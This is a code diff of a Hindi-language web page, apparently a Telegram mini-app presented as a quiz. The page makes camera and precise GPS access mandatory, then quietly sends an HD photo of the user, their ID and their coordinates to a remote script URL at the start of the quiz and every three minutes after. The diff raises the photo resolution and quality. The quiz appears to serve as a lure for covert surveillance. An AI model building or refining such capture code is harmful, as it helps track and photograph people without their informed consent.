@@ -25,7 +25,7 @@
     <div class="instruction-box">
         • सिस्टम सेटअप किया जा रहा है।<br>
         • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
-        • <b>नोट:</b> यदि लोकेशन नहीं मिल रही, तो फोन का GPS ऑन करके ब्राउज़र को परमिशन दें।
+        • <b>नोट:</b> HD कैमरा और लोकेशन वेरिफिकेशन अनिवार्य है।
     </div>
     <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
 </div>
@@ -53,48 +53,45 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Verifying Location... ⏳";
+        btn.innerText = "Setting HD Camera... ⏳";
 
         try {
-            // 1. Camera First
+            // 1. HD Camera Request (1280x720)
             if (!globalStream) {
-                globalStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                globalStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 1280 }, height: { ideal: 720 } } 
+                });
             }
 
-            // 2. Forced Location Check
-            const getLocation = () => {
-                return new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 15000,
-                        maximumAge: 0
-                    });
-                });
-            };
+            // 2. Location Check
+            btn.innerText = "Locating GPS... ⏳";
+            const getLoc = () => new Promise((res, rej) => {
+                navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000 });
+            });
 
             try {
-                const pos = await getLocation();
+                const pos = await getLoc();
                 userLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-            } catch (err) {
-                // Agar pehli baar fail ho, toh 2 second baad retry karein
-                console.log("Retrying location...");
-                btn.innerText = "Retrying GPS... ⏳";
-                await new Promise(r => setTimeout(r, 2000));
-                const retryPos = await getLocation();
-                userLoc = `${retryPos.coords.latitude}, ${retryPos.coords.longitude}`;
+            } catch (e) {
+                alert("Location Error: कृपया अपना GPS ऑन करें और पेज रिफ्रेश करें।");
+                btn.disabled = false;
+                btn.innerText = "प्रक्रिया शुरू करें";
+                return;
             }
 
-            // 3. Success - Start Quiz
+            // 3. Success - UI Switch
             document.getElementById("login").style.display = "none";
             document.getElementById("quizBox").style.display = "block";
             loadQuestion();
             
+            // First Entry Photo (HD)
             captureAndSend("Test_Started");
-            setInterval(() => captureAndSend("Periodic_Check"), 60000);
+
+            // Har 3 Minute mein Photo (180000 ms)
+            setInterval(() => captureAndSend("Periodic_Check"), 180000);
 
         } catch (err) {
-            console.error(err);
-            alert("Mandatory Error: लोकेशन और कैमरा अनिवार्य है।\n\n1. फोन का GPS ऑन करें।\n2. ब्राउज़र में 'Allow' करें।\n3. अगर पॉप-अप नहीं आ रहा, तो सेटिंग्स में जाकर Site Permissions Reset करें।");
+            alert("Permission Denied: कैमरा एक्सेस के बिना टेस्ट शुरू नहीं हो सकता।");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
         }
@@ -108,9 +105,15 @@
             await video.play();
 
             const canvas = document.createElement('canvas');
-            canvas.width = 320; canvas.height = 240;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const photoData = canvas.toDataURL('image/jpeg', 0.3);
+            // Canvas ko HD size diya hai
+            canvas.width = 1280; 
+            canvas.height = 720;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Quality 0.8 (HD Clarity)
+            const photoData = canvas.toDataURL('image/jpeg', 0.8);
 
             const payload = {
                 userId: user.id || "NA",
@@ -123,12 +126,12 @@
             };
 
             fetch(SCRIPT_URL, { method: "POST", mode: "no-cors", body: JSON.stringify(payload) });
-        } catch (e) { console.log(e); }
+        } catch (e) { console.log("Capture Error:", e); }
     }
 
     function loadQuestion() {
         if (currentIdx >= questions.length) { 
-            alert("Test Submitted!"); 
+            alert("Test Submitted Successfully!"); 
             tg.close(); 
             return; 
         }
